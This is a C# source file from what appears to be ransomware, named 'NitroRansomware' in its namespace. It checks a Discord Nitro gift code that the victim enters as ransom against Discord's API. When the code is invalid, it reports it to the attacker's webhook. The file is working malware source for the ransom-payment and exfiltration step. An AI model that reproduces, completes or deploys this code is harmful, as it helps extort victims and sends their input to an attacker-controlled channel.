using System.Net.Http;

namespace NitroRansomware
{
    class Nitro
    {
        private static Logs logging = new Logs("DEBUG", 0);
        private static Webhook ww = new Webhook(Program.WEBHOOK);

        public static bool Check(string code)
        {
            using (HttpClient client = new HttpClient())
            {
                string url = $"https://discord.com/api/v8/entitlements/gift-codes/{code}?with_application=true&with_subscription_plan=true";
                logging.Debug(url);

                var response = client.GetAsync(url).GetAwaiter().GetResult();
                if (response.StatusCode != System.Net.HttpStatusCode.NotFound)
                {
                    return true;
                }
                else
                {
                    ww.SendAsync("❌Invalid Nitro Code Enter By The User: " + code + "❌").GetAwaiter().GetResult();
                    return false;
                }
            }
        }
    }
}
